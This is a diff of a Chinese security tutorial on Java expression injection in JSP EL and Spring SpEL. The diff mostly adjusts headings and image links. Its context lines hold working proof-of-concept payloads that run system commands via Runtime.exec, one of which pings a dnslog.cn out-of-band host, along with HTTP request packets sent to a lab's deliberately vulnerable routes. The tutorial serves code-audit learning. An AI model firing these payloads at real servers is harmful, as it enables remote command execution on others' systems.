@@ -32,13 +32,13 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 ```
 
 ## 4.例子
-### 0x04.1 概述
+## 0x04.1 概述
 
 ```plain
 本示例列举了Java代码审计中最基础的表达式注入环境,读者们可以根据示例来学习该漏洞,并进行举一反三
 ```
 
-### 0x04.2 测试环境目录
+## 0x04.2 测试环境目录
 
 ```plain
 // 目录结构
@@ -63,7 +63,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 │ └── pom.xml
 ```
 
-### 0x04.3 JSP-JSTL_EL
+## 0x04.3 JSP-JSTL_EL
 
 ```plain
 注意:
@@ -73,7 +73,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 要么就是JSP视图的内容可被外部控制导致的
 ```
 
-#### 0x04.3.1 基础操作入门
+### 0x04.3.1 基础操作入门
 
 ```plain
 路径: Java安全慢游记->Java Web基础->Java Server Pages->JSP EL表达式语言
@@ -83,7 +83,7 @@ jar包class: org.springframework.expression.spel.standard.SpelExpressionParser
 链接: https://www.yuque.com/pmiaowu/gpy1q8/kao18q
 ```
 
-#### 0x04.3.2 常用POC
+### 0x04.3.2 常用POC
 
 ```plain
 // 对应于JSP页面中的pageContext对象
@@ -108,7 +108,7 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).inv
 ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('要执行的命令')")}
 ```
 
-#### 0x04.3.3 测试环境搭建
+### 0x04.3.3 测试环境搭建
 
 ```plain
 <!-- 第一步 -->
@@ -157,8 +157,8 @@ public class JspJstlEl {
 }
 ```
 
-#### 0x04.3.4 漏洞测试
-*（配图略）*
+### 0x04.3.4 漏洞测试
+![pasted image 20260618084546](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084546.png)
 
 
 ```plain
@@ -173,7 +173,7 @@ Content-Length: 203
 data=${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"ping -c 1 123.y4hmn1.dnslog.cn")}
 ```
 
-*（配图略）*
+![pasted image 20260618084601](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084601.png)
 
 
 
@@ -186,19 +186,19 @@ Connection: close
 
 ```
 
-*（配图略）*
+![pasted image 20260618084607](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084607.png)
 
-*（配图略）*
+![pasted image 20260618084611](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084611.png)
 
-### 0x04.4 Spring SpEL
-#### 0x04.4.1 基础操作入门
+## 0x04.4 Spring SpEL
+### 0x04.4.1 基础操作入门
 
 ```plain
 路径: Java安全慢游记->Java Web基础->Spring->Spring SpEL
 链接: https://www.yuque.com/pmiaowu/gpy1q8/doc14tgd5x5zc15p
 ```
 
-#### 0x04.4.2 常用POC
+### 0x04.4.2 常用POC
 
 ```plain
 POC格式:
@@ -223,7 +223,7 @@ T(Thread).sleep(10000)
 new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()
 ```
 
-#### 0x04.4.3 测试环境搭建
+### 0x04.4.3 测试环境搭建
 
 ```java
 // 第一步
@@ -266,8 +266,8 @@ public class SpEL {
 }
 ```
 
-#### 0x04.4.4 漏洞测试
-##### 0x04.4.4.1 test路由
+### 0x04.4.4 漏洞测试
+#### 0x04.4.4.1 test路由
 
 ```plain
 // test路由,漏洞测试数据包,测试漏洞是否存在
@@ -280,7 +280,7 @@ Content-Length: 41
 s=new String('hello world').toUpperCase()
 ```
 
-*（配图略）*
+![pasted image 20260618084625](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084625.png)
 
 
 
@@ -295,9 +295,9 @@ Content-Length: 97
 s=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()
 ```
 
-*（配图略）*
+![pasted image 20260618084631](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084631.png)
 
-##### 0x04.4.4.2 test2路由
+#### 0x04.4.4.2 test2路由
 
 ```plain
 // test2路由,漏洞测试数据包,测试漏洞是否存在
@@ -310,7 +310,7 @@ Content-Length: 19
 s=aaaa#{12*12}fffff
 ```
 
-*（配图略）*
+![pasted image 20260618084636](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084636.png)
 
 ```plain
 // test2路由,漏洞测试数据包,命令执行测试
@@ -323,17 +323,17 @@ Content-Length: 100
 s=#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}
 ```
 
-*（配图略）*
+![pasted image 20260618084642](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084642.png)
 
 ## 0x05 特别致谢
-### 0x05.1 前言
+## 0x05.1 前言
 最终的成品文章,基本复制了以前网上大佬们的分享
 
 然后添加了一些例子,在此特别感谢大佬们,无私分享的精神!!!  
   
 谢谢!!!!!!
 
-### 0x05.2 参考文章
+## 0x05.2 参考文章
 https://misakikata.github.io/2018/09/表达式注入/#Struts2——OGNL
 
 https://blog.csdn.net/weixin_43610673/article/details/125941767
